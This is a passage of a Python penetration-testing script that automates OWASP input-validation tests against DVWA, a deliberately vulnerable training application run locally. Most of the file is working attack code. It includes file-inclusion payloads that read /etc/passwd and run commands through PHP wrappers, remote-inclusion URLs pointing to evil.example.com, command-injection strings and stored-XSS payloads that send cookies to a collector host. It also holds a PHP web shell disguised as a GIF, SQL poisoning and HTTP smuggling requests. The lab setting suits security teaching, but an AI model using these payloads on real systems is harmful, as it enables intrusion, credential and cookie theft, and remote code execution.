                                resp = self.session.post(form_action, data=data)
                            else:
                                resp = self.session.get(form_action, params=data)
                            
                            # Analyze response for IMAP/SMTP injection
                            self._check_imap_smtp_response(resp, payload)
                        
                        except Exception as e:
                            self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                            continue
        
        self.write_log("----- OTG-INPVAL-011 Test Completed -----\n")
    
    def _check_imap_smtp_response(self, resp, payload):
        """Helper method to check responses for signs of IMAP/SMTP injection"""
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with payload '{payload}'")
            return
            
        # Check for signs of successful IMAP/SMTP injection
        success_patterns = [
            ("IMAP", "Possible IMAP command injection"),
            ("SMTP", "Possible SMTP command injection"),
            ("CAPABILITY", "IMAP capability exposed"),
            ("RCPT TO", "SMTP recipient modification"),
            ("CREATE", "IMAP folder creation attempt"),
            ("VRFY", "SMTP user verification"),
            ("EXPN", "SMTP mailing list expansion"),
            ("SELECT", "IMAP mailbox selection"),
            ("FETCH", "IMAP message retrieval"),
            ("malformed", "Possible command injection"),
            ("syntax error", "Possible command injection"),
            ("unexpected", "Possible command injection")
        ]
        
        for pattern, message in success_patterns:
            if pattern.lower() in resp.text.lower():
                self.write_log(f"    [✓] {message} with payload '{payload}'")
                return
        
        # Check for error messages
        error_patterns = [
            "command", "server responded", "invalid", 
            "unexpected", "failed", "error"
        ]
        
        for error in error_patterns:
            if error.lower() in resp.text.lower():
                self.write_log(f"    [!] Possible IMAP/SMTP injection - {error} with payload '{payload}'")
                return
            
        # Check if payload is reflected
        if payload.strip("\"'") in resp.text:
            self.write_log(f"    [!] Payload partially reflected with '{payload}'")
        else:
            self.write_log(f"    [-] No obvious IMAP/SMTP injection with payload '{payload}'")


    def OTG_INPVAL_012(self):
        """Test for Code Injection (LFI/RFI) - DVWA Specific"""
        self.write_log("----- Starting OTG-INPVAL-012 (Code Injection - LFI/RFI) -----")
        
        # DVWA's File Inclusion page
        target_url = f"{self.base_url}/vulnerabilities/fi/"
        param_name = "page"  # DVWA uses 'page' parameter
        
        # Common sensitive files to check for LFI
        sensitive_files = [
            "/etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../etc/passwd%00",
            "....//....//....//etc/passwd",
            "/etc/hosts",
            "/proc/self/environ",
            "../../../../../../windows/system32/drivers/etc/hosts",
            "file:///etc/passwd"
        ]
        
        # PHP wrapper payloads
        php_wrappers = [
            "php://filter/convert.base64-encode/resource=include.php",
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain,<?php echo shell_exec('id'); ?>",
            "data://text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCdpZCcpOyA/Pg==",
            "expect://id"
        ]
        
        # Remote file inclusion test URLs
        rfi_test_urls = [
            "http://evil.example.com/shell.txt",
            "\\\\evil.example.com\\share\\shell.txt"
        ]
        
        # First test the default page to understand behavior
        self.write_log("\n[i] Testing default file inclusion behavior")
        try:
            resp = self.session.get(target_url, params={param_name: "include.php"})
            default_response_length = len(resp.text)
            self.write_log(f"  - Default response length: {default_response_length} bytes")
        except Exception as e:
            self.write_log(f"  [x] Error testing default page: {str(e)}")
            return
        
        # Test for Local File Inclusion
        self.write_log("\n[i] Testing for Local File Inclusion (LFI)")
        for file_path in sensitive_files:
            try:
                test_params = {param_name: file_path}
                resp = self.session.get(target_url, params=test_params)
                
                # Check for signs of successful LFI
                if "root:x:" in resp.text:
                    self.write_log(f"  [✓] /etc/passwd disclosure with payload '{file_path}'")
                elif len(resp.text) != default_response_length:
                    self.write_log(f"  [!] Different response length ({len(resp.text)} bytes) with payload '{file_path}'")
                elif "No such file" in resp.text:
                    self.write_log(f"  [-] File not found with payload '{file_path}'")
                elif "Warning" in resp.text or "Error" in resp.text:
                    self.write_log(f"  [!] Possible LFI - Error with payload '{file_path}'")
                else:
                    self.write_log(f"  [-] No obvious LFI with payload '{file_path}'")
                    
            except Exception as e:
                self.write_log(f"  [x] Error testing file '{file_path}': {str(e)}")
        
        # Test PHP wrappers
        self.write_log("\n[i] Testing PHP wrappers")
        for wrapper in php_wrappers:
            try:
                test_params = {param_name: wrapper}
                resp = self.session.get(target_url, params=test_params)
                
                if "PD9waHA" in resp.text or "<?php" in resp.text:
                    self.write_log(f"  [✓] Possible PHP source code disclosure with wrapper '{wrapper}'")
                elif "uid=" in resp.text and "gid=" in resp.text:
                    self.write_log(f"  [✓] Possible command execution with wrapper '{wrapper}'")
                elif "Warning" in resp.text or "Error" in resp.text:
                    self.write_log(f"  [!] PHP wrapper error with payload '{wrapper}'")
                else:
                    self.write_log(f"  [-] No obvious PHP wrapper exploitation with '{wrapper}'")
                    
            except Exception as e:
                self.write_log(f"  [x] Error testing wrapper '{wrapper}': {str(e)}")
        
        # Test for Remote File Inclusion
        self.write_log("\n[i] Testing for Remote File Inclusion (RFI)")
        for rfi_url in rfi_test_urls:
            try:
                test_params = {param_name: rfi_url}
                resp = self.session.get(target_url, params=test_params)
                
                if "evil.example.com" in resp.text:
                    self.write_log(f"  [✓] Possible RFI with payload '{rfi_url}'")
                elif "failed to open stream" in resp.text:
                    self.write_log(f"  [!] RFI attempt blocked with payload '{rfi_url}'")
                else:
                    self.write_log(f"  [-] No obvious RFI with payload '{rfi_url}'")
                    
            except Exception as e:
                self.write_log(f"  [x] Error testing RFI URL '{rfi_url}': {str(e)}")
        
        self.write_log("----- OTG-INPVAL-012 Test Completed -----\n")


    def OTG_INPVAL_013(self):
        """Test for Command Injection"""
        self.write_log("----- Starting OTG-INPVAL-013 (Command Injection) -----")
        
        # DVWA's command injection page
        target_url = f"{self.base_url}/vulnerabilities/exec/"
        
        # Command injection payloads
        command_payloads = [
            # Basic command separators
            "127.0.0.1; id",
            "127.0.0.1 && whoami",
            "127.0.0.1 | ls -la",
            "127.0.0.1 || uname -a",
            
            # Subshell commands
            "127.0.0.1$(echo 'TESTING')",
            "127.0.0.1`echo 'TESTING'`",
            
            # Command substitution
            "127.0.0.1; echo $(whoami)",
            "127.0.0.1 && cat /etc/passwd",
            
            # Windows specific commands (if testing Windows)
            "127.0.0.1 & ipconfig",
            "127.0.0.1 | dir",
            
            # Blind command injection
            "127.0.0.1; ping -c 1 localhost",
            "127.0.0.1 && sleep 5",
            
            # Special characters
            "127.0.0.1' whoami '",
            '127.0.0.1" && ls "',
            "127.0.0.1\nid\n",
            
            # URL encoded payloads
            "127.0.0.1%3Bid%00",
            "127.0.0.1%26%26whoami"
        ]
        
        self.write_log(f"[i] Testing URL: {target_url}")
        
        # First get the page to find the form
        resp = self.session.get(target_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        form = soup.find('form')
        
        if not form:
            self.write_log("  - No form found on page")
            return
            
        # Handle form action
        form_action = form.get('action')
        if not form_action or form_action == '#':
            form_action = target_url
        else:
            if not form_action.startswith(('http://', 'https://')):
                form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{target_url}{form_action}"
        
        form_method = form.get('method', 'POST').upper()
        inputs = form.find_all('input')
        
        # Find the input parameter (DVWA uses 'ip')
        input_name = None
        for input_tag in inputs:
            if input_tag.get('name') and input_tag.get('type') != 'hidden':
                input_name = input_tag.get('name')
                break
        
        if not input_name:
            self.write_log("  - No input parameter found in form")
            return
            
        self.write_log(f"  - Found input parameter: {input_name}")
        
        # Test each command injection payload
        for payload in command_payloads:
            try:
                # Prepare the POST data
                data = {input_name: payload}
                
                # Include all other form inputs (like CSRF token)
                for inp in inputs:
                    name = inp.get('name')
                    value = inp.get('value', '')
                    if name and name != input_name:
                        data[name] = value
                
                # Send the request
                if form_method == 'POST':
                    resp = self.session.post(form_action, data=data)
                else:
                    resp = self.session.get(form_action, params=data)
                
                # Analyze response for command injection
                self._check_command_injection_response(resp, payload)
            
            except Exception as e:
                self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                continue
        
        self.write_log("----- OTG-INPVAL-013 Test Completed -----\n")
    
    def _check_command_injection_response(self, resp, payload):
        """Helper method to check responses for signs of command injection"""
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with payload '{payload}'")
            return
            
        # Check for signs of successful command injection
        success_patterns = [
            ("uid=", "Possible command execution (id)"),
            ("root:x:", "Possible /etc/passwd disclosure"),
            ("Volume Serial Number", "Possible command execution (dir/ipconfig)"),
            ("Directory of", "Possible command execution (dir/ls)"),
            ("inet ", "Possible command execution (ifconfig/ipconfig)"),
            ("TESTING", "Possible command execution (echo)"),
            ("Linux", "Possible command execution (uname)"),
            ("Microsoft", "Possible command execution (ver)"),
            ("PING", "Possible command execution (ping)"),
            ("total ", "Possible command execution (ls -la)")
        ]
        
        for pattern, message in success_patterns:
            if pattern in resp.text:
                self.write_log(f"    [✓] {message} with payload '{payload}'")
                return
        
        # Check for error messages
        error_patterns = [
            "sh:", "bash:", "cmd.exe", "syntax error", 
            "command not found", "not recognized", "failed",
            "Warning", "Error", "Exception"
        ]
        
        for error in error_patterns:
            if error.lower() in resp.text.lower():
                self.write_log(f"    [!] Possible command injection - {error} with payload '{payload}'")
                return
            
        # Check timing for blind command injection
        if "sleep" in payload or "ping" in payload:
            self.write_log(f"    [?] Blind command injection attempt with '{payload}' - check manually")
            return
            
        self.write_log(f"    [-] No obvious command injection with payload '{payload}'")


    def OTG_INPVAL_014(self):
        """Test for Buffer Overflow Related Vulnerabilities"""
        self.write_log("----- Starting OTG-INPVAL-014 (Buffer Overflow Testing) -----")
        
        # Target URLs that might handle large inputs
        test_urls = [
            f"{self.base_url}/vulnerabilities/exec/",  # Command injection
            f"{self.base_url}/vulnerabilities/fi/",    # File inclusion
            f"{self.base_url}/vulnerabilities/sqli/",  # SQL injection
            f"{self.base_url}/contact.php"             # Contact forms
        ]
        
        # Buffer overflow test patterns (payload, description)
        buffer_payloads = [
            ("A" * 10000, "Simple long string (10k chars)"),
            ("\x00" * 5000, "Null byte pattern (5k bytes)"),
            ("%n" * 1000, "Format string specifiers"),
            ("ABCD" * 2500, "Repeating pattern (10k bytes)"),
            ("\x41\x42\x43\x44" * 2500, "Hex pattern repetition"),
            ("A" * 100000, "Very long string (100k chars)"),
            ("A" * 1000000, "Extremely long string (1M chars)"),
            ("%s" * 500, "Format string (%s)"),
            ("%x" * 500, "Format string (%x)"),
            ("%n" * 100, "Format string (%n)"),
            ("\xff" * 5000, "Hex FF pattern"),
            ("\x00\x01\x02\x03\x04" * 2000, "Hex incrementing pattern")
        ]
        
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            # Get the page to find forms
            resp = self.session.get(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                self.write_log("  - No forms found on page")
                continue
                
            for form in forms:
                # Handle form action
                form_action = form.get('action')
                if not form_action or form_action == '#':
                    form_action = url
                else:
                    if not form_action.startswith(('http://', 'https://')):
                        form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{url}{form_action}"
                
                form_method = form.get('method', 'POST').upper()
                inputs = form.find_all('input')
                
                # Find all input parameters
                param_names = []
                for input_tag in inputs:
                    if input_tag.get('name') and input_tag.get('type') != 'hidden':
                        param_names.append(input_tag.get('name'))
                
                if not param_names:
                    self.write_log("  - No parameters found in form")
                    continue
                
                # Test each parameter with buffer payloads
                for param in param_names:
                    self.write_log(f"  - Testing parameter: {param}")
                    
                    for payload, description in buffer_payloads:  # Fixed iteration here
                        try:
                            # Prepare the payload data
                            data = {}
                            for inp in inputs:
                                name = inp.get('name')
                                value = inp.get('value', '')
                                if name == param:
                                    data[name] = payload
                                elif name:
                                    data[name] = value
                            
                            # Send the request with timeout
                            try:
                                if form_method == 'POST':
                                    resp = self.session.post(form_action, data=data, timeout=30)
                                else:
                                    resp = self.session.get(form_action, params=data, timeout=30)
                                
                                # Analyze response for buffer overflow signs
                                self._check_buffer_response(resp, description)
                            
                            except requests.exceptions.Timeout:
                                self.write_log(f"    [!] Timeout occurred with {description} - possible DoS vulnerability")
                            except requests.exceptions.ConnectionError:
                                self.write_log(f"    [!] Connection error with {description} - possible crash")
                        
                        except Exception as e:
                            self.write_log(f"    [x] Error testing {description}: {str(e)}")
                            continue
        
        self.write_log("----- OTG-INPVAL-014 Test Completed -----\n")
    
    def _check_buffer_response(self, resp, payload_description):
        """Helper method to check responses for signs of buffer issues"""
        if resp.status_code == 500:
            self.write_log(f"    [✓] Server error (500) with {payload_description} - possible overflow")
            return
        elif resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with {payload_description}")
            return
            
        # Check for error messages
        error_patterns = [
            "overflow", "buffer", "memory", "segmentation",
            "fault", "violation", "stack", "heap",
            "format string", "corruption", "terminated"
        ]
        
        for error in error_patterns:
            if error.lower() in resp.text.lower():
                self.write_log(f"    [!] Possible memory issue - {error} in response to {payload_description}")
                return
            
        # Check for truncated responses
        if len(resp.text) < 100:  # Very short response
            self.write_log(f"    [!] Very short response ({len(resp.text)} chars) to {payload_description}")
            return
            
        self.write_log(f"    [-] No obvious buffer issues with {payload_description}")


    def OTG_INPVAL_015(self):
        """Test for Incubated Vulnerabilities"""
        self.write_log("----- Starting OTG-INPVAL-015 (Incubated Vulnerability Testing) -----")
        
        # Target URLs that might store data
        test_urls = [
            f"{self.base_url}/vulnerabilities/xss_s/",  # Stored XSS (Guestbook)
            f"{self.base_url}/vulnerabilities/upload/", # File upload
            f"{self.base_url}/vulnerabilities/sqli/"    # SQLi that might store data
        ]
        
        # Incubated attack payloads (payload, description)
        incubated_payloads = [
            # Stored XSS payloads
            (
                '<script>document.write(\'<img src="http://localhost:8000/collect?cookie=\'+document.cookie+\'">\')</script>',
                "Stored XSS to capture cookies"
            ),
            (
                '<script>new Image().src="http://localhost:8000/collect?cookie="+document.cookie;</script>',
                "Silent cookie capture"
            ),
            
            # File upload payloads
            (
                "GIF89a;<?php system($_GET['cmd']); ?>",
                "PHP shell in fake GIF"
            ),
            (
                '<script>alert("Incubated XSS")</script>',
                "HTML file with XSS"
            ),
            
            # SQLi data poisoning
            (
                "admin' OR 1=1; UPDATE guestbook SET comment=CONCAT(comment,'<script>alert(1)</script>') WHERE comment LIKE '%';--",
                "SQLi to inject XSS into all comments"
            )
        ]
        
        # Test each vulnerable endpoint
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            # Get the page to find forms
            resp = self.session.get(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                self.write_log("  - No forms found on page")
                continue
                
            for form in forms:
                # Handle form action
                form_action = form.get('action')
                if not form_action or form_action == '#':
                    form_action = url
                else:
                    if not form_action.startswith(('http://', 'https://')):
                        form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{url}{form_action}"
                
                form_method = form.get('method', 'POST').upper()
                inputs = form.find_all('input')
                textareas = form.find_all('textarea')
                
                # Find all input parameters
                param_names = []
                for input_tag in inputs + textareas:
                    if input_tag.get('name') and input_tag.get('type') != 'hidden':
                        param_names.append(input_tag.get('name'))
                
                if not param_names:
                    self.write_log("  - No parameters found in form")
                    continue
                
                # Test each parameter with incubated payloads
                for param in param_names:
                    self.write_log(f"  - Testing parameter: {param}")
                    
                    for payload, description in incubated_payloads:
                        try:
                            # Prepare the payload data
                            data = {}
                            file_data = None
                            
                            for inp in inputs + textareas:
                                name = inp.get('name')
                                value = inp.get('value', '')
                                
                                # Handle file uploads differently
                                if inp.get('type') == 'file':
                                    if "<?php" in payload or "GIF89a" in payload:
                                        file_data = {name: ('test.gif', payload, 'image/gif')}
                                elif name == param:
                                    data[name] = payload
                                elif name:
                                    data[name] = value
                            
                            # Send the request
                            try:
                                if file_data:
                                    resp = self.session.post(form_action, files=file_data, data=data, timeout=30)
                                elif form_method == 'POST':
                                    resp = self.session.post(form_action, data=data, timeout=30)
                                else:
                                    resp = self.session.get(form_action, params=data, timeout=30)
                                
                                # Check if payload was stored successfully
                                if payload.split('<')[0] in resp.text:
                                    self.write_log(f"    [✓] Payload appears stored: {description}")
                                    self.write_log(f"    [*] Manual verification needed for: {payload[:50]}...")
                                else:
                                    self.write_log(f"    [-] Payload not stored: {description}")
                            
                            except requests.exceptions.Timeout:
                                self.write_log(f"    [!] Timeout occurred with {description}")
                            except requests.exceptions.ConnectionError:
                                self.write_log(f"    [!] Connection error with {description}")
                        
                        except Exception as e:
                            self.write_log(f"    [x] Error testing {description}: {str(e)}")
                            continue
        
        self.write_log("\n[i] Note: Incubated vulnerabilities require manual verification:")
        self.write_log("    - Check if payloads execute when pages are revisited")
        self.write_log("    - Monitor your listener for callbacks")
        self.write_log("    - Verify database changes persist")
        self.write_log("----- OTG-INPVAL-015 Test Completed -----\n")


    def OTG_INPVAL_016(self):
        """Test for HTTP Splitting/Smuggling"""
        self.write_log("----- Starting OTG-INPVAL-016 (HTTP Splitting/Smuggling) -----")
        
        # Target URLs that might be vulnerable
        test_urls = [
            f"{self.base_url}/vulnerabilities/fi/?page=include.php",  # File inclusion
            f"{self.base_url}/login.php",                            # Login with redirects
            f"{self.base_url}/vulnerabilities/exec/"                 # Command execution
        ]
        
        # HTTP Splitting payloads
        splitting_payloads = [
            # CRLF injection in headers
            ("%0d%0aX-Malicious-Header: injected", "Simple CRLF injection"),
            ("%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 25%0d%0a%0d%0a<h1>Hacked</h1>", 
             "Full response splitting"),
            
            # Location header specific
            ("http://example.com%0d%0aX-Forwarded-For: 127.0.0.1", "Location header CRLF"),
            ("http://example.com%0d%0aSet-Cookie: malicious=payload", "Cookie injection via Location"),
            
            # Special encoding variations
            ("%250d%250aX-Injected: test", "Double-encoded CRLF"),
            ("%u000d%u000aX-Injected: test", "Unicode CRLF")
        ]
        
        # HTTP Smuggling payloads
        smuggling_payloads = [
            # Chunked encoding smuggling
            ("0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n", "Chunked encoding smuggling"),
            
            # Content-Length discrepancies
            ("POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 56\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
             "CL.TE smuggling"),
             
            ("GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG", 
             "TE.CL smuggling"),
             
            # Double Content-Length
            ("POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 8\r\nContent-Length: 7\r\n\r\n12345678",
             "Double Content-Length")
        ]
        
        # Test HTTP Splitting
        self.write_log("\n[i] Testing for HTTP Splitting (CRLF Injection)")
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            # Check if URL has parameters
            if '?' in url:
                base_url = url.split('?')[0]
                params = dict(pair.split('=') for pair in url.split('?')[1].split('&'))
            else:
                base_url = url
                params = {}
            
            # Test each parameter with splitting payloads
            for param in params.keys():
                self.write_log(f"  - Testing parameter: {param}")
                
                for payload, description in splitting_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        # Send request and capture headers
                        resp = self.session.get(base_url, params=test_params, allow_redirects=False)
                        
                        # Check for injected headers
                        for header in resp.headers:
                            if 'malicious' in header.lower() or 'injected' in header.lower():
                                self.write_log(f"    [✓] Header injection successful: {description}")
                                self.write_log(f"        Injected header: {header}")
                                break
                        else:
                            self.write_log(f"    [-] No header injection with: {description}")
                    
                    except Exception as e:
                        self.write_log(f"    [x] Error testing {description}: {str(e)}")
        
        # Test HTTP Smuggling
        self.write_log("\n[i] Testing for HTTP Smuggling")
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            for payload, description in smuggling_payloads:
                try:
                    # Prepare raw HTTP request
                    parsed_url = urlparse(url)
                    path = parsed_url.path or "/"
                    if parsed_url.query:
                        path += "?" + parsed_url.query
                    
                    host = parsed_url.hostname or "localhost"
                    port = parsed_url.port or 80

                    # Build raw request
                    raw_request = f"POST {path} HTTP/1.1\r\n"
                    raw_request += f"Host: {host}\r\n"
                    raw_request += payload + "\r\n"

                    # Send raw request
                    s = None
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))
                        s.send(raw_request.encode())
                        response = s.recv(4096).decode(errors='ignore')
                    finally:
                        if s:
                            s.close()

                        # Check for anomalies
                        if "HTTP/1.1 400" in response:
                            self.write_log(f"    [-] Server rejected malformed request: {description}")
                        else:
                            self.write_log(f"    [!] Possible smuggling vulnerability: {description}")
                            self.write_log(f"        Response: {response[:100]}...")
                
                except Exception as e:
                    self.write_log(f"    [x] Error preparing {description}: {str(e)}")
        
        self.write_log("\n[i] Note: HTTP Smuggling tests may require manual verification:")
        self.write_log("    - Check server logs for abnormal requests")
        self.write_log("    - Test with a proxy to observe request parsing")
        self.write_log("    - Verify with different intermediaries (proxies, WAFs)")
        self.write_log("----- OTG-INPVAL-016 Test Completed -----\n")

def main():
    parser = argparse.ArgumentParser(description='DVWA Security Tester')
    parser.add_argument('--url', default='http://localhost:8080', help='DVWA base URL')
    parser.add_argument('--username', default='admin', help='DVWA username')
    parser.add_argument('--password', default='password', help='DVWA password')
    parser.add_argument('--tests', nargs='+', 
                       choices=['ALL', 'OTG_INPVAL_001', 'OTG_INPVAL_002', 
                                'OTG_INPVAL_003', 'OTG_INPVAL_004', 
                                'OTG_INPVAL_005', 'OTG_INPVAL_005_Blind',
                                'OTG_INPVAL_006', 'OTG_INPVAL_007',
                                'OTG_INPVAL_008', 'OTG_INPVAL_009', 
                                'OTG_INPVAL_010', 'OTG_INPVAL_011', 
                                'OTG_INPVAL_012', 'OTG_INPVAL_013',
                                'OTG_INPVAL_014', 'OTG_INPVAL_015',
                                'OTG_INPVAL_016'],
                       default=['ALL'],
                       help='Tests to run (default: ALL)')
    args = parser.parse_args()
    
    tester = DVWATester(base_url=args.url, username=args.username, password=args.password)
    
    if not tester.login():
        print("[-] Login failed. Exiting.")
        return
    
    # Determine which tests to run
    if 'ALL' in args.tests:
        tests_to_run = ['OTG_INPVAL_001', 'OTG_INPVAL_002', 'OTG_INPVAL_003', 
                       'OTG_INPVAL_004', 'OTG_INPVAL_005', 'OTG_INPVAL_005_Blind',
                       'OTG_INPVAL_006', 'OTG_INPVAL_007', 'OTG_INPVAL_008',
                       'OTG_INPVAL_009', 'OTG_INPVAL_010', 'OTG_INPVAL_011',
                       'OTG_INPVAL_012', 'OTG_INPVAL_013', 'OTG_INPVAL_014',
                       'OTG_INPVAL_015', 'OTG_INPVAL_016']
    else:
        tests_to_run = args.tests
    
    # Run the tests
    test_functions = {
        'OTG_INPVAL_001': tester.OTG_INPVAL_001,
        'OTG_INPVAL_002': tester.OTG_INPVAL_002,
        'OTG_INPVAL_003': tester.OTG_INPVAL_003,
        'OTG_INPVAL_004': tester.OTG_INPVAL_004,
        'OTG_INPVAL_005': tester.OTG_INPVAL_005,
        'OTG_INPVAL_005_Blind': tester.OTG_INPVAL_005_Blind,
        'OTG_INPVAL_006': tester.OTG_INPVAL_006,
        'OTG_INPVAL_007': tester.OTG_INPVAL_007,
        'OTG_INPVAL_008': tester.OTG_INPVAL_008,
        'OTG_INPVAL_009': tester.OTG_INPVAL_009,
        'OTG_INPVAL_010': tester.OTG_INPVAL_010,
        'OTG_INPVAL_011': tester.OTG_INPVAL_011,
        'OTG_INPVAL_012': tester.OTG_INPVAL_012,
        'OTG_INPVAL_013': tester.OTG_INPVAL_013,
        'OTG_INPVAL_014': tester.OTG_INPVAL_014,
        'OTG_INPVAL_015': tester.OTG_INPVAL_015,
        'OTG_INPVAL_016': tester.OTG_INPVAL_016
    }
    
    for test in tests_to_run:
        if test in test_functions:
            print(f"\n[+] Running {test}...")
            test_functions[test]()
        else:
            print(f"[!] Unknown test: {test}")

if __name__ == "__main__":
    main()